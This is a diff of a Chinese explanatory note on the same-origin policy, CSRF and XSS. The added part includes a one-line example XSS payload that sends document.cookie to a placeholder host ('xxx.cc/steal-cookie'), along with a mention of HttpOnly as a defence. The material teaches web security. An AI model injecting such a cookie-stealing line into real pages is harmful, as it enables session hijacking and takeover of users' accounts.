@@ -14,9 +14,17 @@
 
 因为需要防范CSRF（Cross-site request forgery）攻击
 
-> CSRF：简单来说，CSRF就是如果我们登录了一个正常网站A并且在本地生成Cookie，并且未退出的情况下，同时又访问了另一个危险网站B，网站B里面有一段恶意脚本，通过利用本地的cookies来通过验证并且成功访问A网站的接口来实现一些操作。[具体浏览](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
+> CSRF：简单来说，CSRF就是如果我们登录了一个正常网站A并且在本地生成Cookie，并且未退出的情况下，同时又访问了另一个危险网站B，网站B里面有一段恶意脚本，通过利用（图片的src避开跨域限制之类）本地的cookies来通过验证并且成功访问A网站的接口来实现一些操作。[具体浏览](http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)
 
 若是没有同源策略，那么网络安全可能就会差上很多，不仅仅是不同页面之间可以相互访问对方的服务接口，还因为是cookies可以随意被别的网页上的脚本访问并且可以直接访问带权限的接口，这对于恶意网站来说，想要操作用户的账户做任何操作实在是太轻松了。所以同源策略是必须的。
+
+> 还有一种常见的被动攻击方式：XSS，应该是在网站中插入代码来盗取用户的cookie
+
+```
+(new Image()).src = 'http://xxx.cc/steal-cookie?cookies=' + document.cookie
+```
+
+XSS攻击可以设置cookie的HttpOnly属性，进行一定程度上的防范。
 
 ---
 
